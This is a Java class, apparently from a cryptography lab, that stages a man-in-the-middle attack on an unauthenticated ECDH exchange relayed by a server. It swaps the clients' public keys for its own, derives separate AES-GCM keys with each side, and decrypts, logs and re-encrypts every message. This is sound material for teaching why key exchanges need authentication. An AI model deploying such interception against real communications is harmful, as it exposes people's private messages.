import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.X509EncodedKeySpec;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.KeyAgreement;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class ServerInterceptor {

    private KeyPair mitmKeyPairForClient1;
    private KeyPair mitmKeyPairForClient2;

    private SecretKeySpec aesKeyWithClient1;
    private SecretKeySpec aesKeyWithClient2;

    private boolean client1HandshakeDone = false;
    private boolean client2HandshakeDone = false;

    public ServerInterceptor() {
        System.out.println("[Server] MITM ECDH attack mode");

        try {
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("EC");
            kpg.initialize(256);

            // Paire utilisée pour parler à client 1
            mitmKeyPairForClient1 = kpg.generateKeyPair();

            // Paire utilisée pour parler à client 2
            mitmKeyPairForClient2 = kpg.generateKeyPair();

        } catch (Exception e) {
            throw new RuntimeException("Failed to initialize MITM keys", e);
        }
    }

    public String onMessageRelay(String message, int fromClient, int toClient) {
        try {
            System.out.println("[MITM] Intercepted from " + fromClient + " to " + toClient + ": " + message);

            // Phase handshake : échange des clés publiques ECDH
            if (isLikelyPublicKey(message)) {
                return handleHandshakeMessage(message, fromClient, toClient);
            }

            // Phase messages chiffrés
            return handleEncryptedMessage(message, fromClient, toClient);

        } catch (Exception e) {
            System.out.println("[MITM] Error during relay: " + e.getMessage());
            e.printStackTrace();
            return message;
        }
    }

    private boolean isLikelyPublicKey(String message) {
        // Simple heuristique suffisante ici :
        // les clés publiques EC X.509 en Base64 sont longues et ne contiennent pas ':'
        return !message.contains(":") && message.length() > 100;
    }

    private String handleHandshakeMessage(String message, int fromClient, int toClient) throws Exception {
        System.out.println("[MITM] Intercepted ECDH public key from client " + fromClient);

        byte[] clientPubBytes = Base64.getDecoder().decode(message);

        KeyFactory kf = KeyFactory.getInstance("EC");
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(clientPubBytes);
        PublicKey clientPublicKey = kf.generatePublic(keySpec);

        if (fromClient == 1 && !client1HandshakeDone) {
            // Le serveur calcule la clé partagée avec client 1
            aesKeyWithClient1 = deriveAesKeyFromECDH(clientPublicKey, mitmKeyPairForClient1);
            client1HandshakeDone = true;

            System.out.println("[MITM] Shared secret established with client 1");

            // On envoie à client 2, à la place de la vraie clé de client 1,
            // la clé publique MITM destinée à client 2
            String fakePubForClient2 = Base64.getEncoder()
                    .encodeToString(mitmKeyPairForClient2.getPublic().getEncoded());

            System.out.println("[MITM] Replacing client 1 public key with MITM public key for client 2");
            return fakePubForClient2;
        }

        if (fromClient == 2 && !client2HandshakeDone) {
            // Le serveur calcule la clé partagée avec client 2
            aesKeyWithClient2 = deriveAesKeyFromECDH(clientPublicKey, mitmKeyPairForClient2);
            client2HandshakeDone = true;

            System.out.println("[MITM] Shared secret established with client 2");

            // On envoie à client 1, à la place de la vraie clé de client 2,
            // la clé publique MITM destinée à client 1
            String fakePubForClient1 = Base64.getEncoder()
                    .encodeToString(mitmKeyPairForClient1.getPublic().getEncoded());

            System.out.println("[MITM] Replacing client 2 public key with MITM public key for client 1");
            return fakePubForClient1;
        }

        return message;
    }

    private SecretKeySpec deriveAesKeyFromECDH(PublicKey otherPublicKey, KeyPair myKeyPair) throws Exception {
        KeyAgreement ka = KeyAgreement.getInstance("ECDH");
        ka.init(myKeyPair.getPrivate());
        ka.doPhase(otherPublicKey, true);
        byte[] sharedSecret = ka.generateSecret();

        MessageDigest sha = MessageDigest.getInstance("SHA-256");
        byte[] hash = sha.digest(sharedSecret);
        byte[] keyBytes = Arrays.copyOf(hash, 16); // AES-128

        return new SecretKeySpec(keyBytes, "AES");
    }

    private String handleEncryptedMessage(String message, int fromClient, int toClient) throws Exception {
        if (aesKeyWithClient1 == null || aesKeyWithClient2 == null) {
            System.out.println("[MITM] Session keys not ready yet");
            return message;
        }

        String clearText;

        if (fromClient == 1 && toClient == 2) {
            clearText = decryptMessage(message, aesKeyWithClient1);
            System.out.println("[MITM] Message en clair de 1 vers 2 : " + clearText);
            return encryptMessage(clearText, aesKeyWithClient2);
        }

        if (fromClient == 2 && toClient == 1) {
            clearText = decryptMessage(message, aesKeyWithClient2);
            System.out.println("[MITM] Message en clair de 2 vers 1 : " + clearText);
            return encryptMessage(clearText, aesKeyWithClient1);
        }

        return message;
    }

    private String decryptMessage(String encryptedText, SecretKeySpec aesKey) throws Exception {
        String[] parts = encryptedText.split(":");
        byte[] iv = Base64.getDecoder().decode(parts[0]);
        byte[] cipherBytes = Base64.getDecoder().decode(parts[1]);

        GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, aesKey, gcmSpec);

        byte[] decrypted = cipher.doFinal(cipherBytes);
        return new String(decrypted, "UTF-8");
    }

    private String encryptMessage(String plainText, SecretKeySpec aesKey) throws Exception {
        byte[] iv = new byte[12];
        SecureRandom random = new SecureRandom();
        random.nextBytes(iv);

        GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, aesKey, gcmSpec);

        byte[] encrypted = cipher.doFinal(plainText.getBytes("UTF-8"));

        String ivBase64 = Base64.getEncoder().encodeToString(iv);
        String cipherBase64 = Base64.getEncoder().encodeToString(encrypted);

        return ivBase64 + ":" + cipherBase64;
    }
}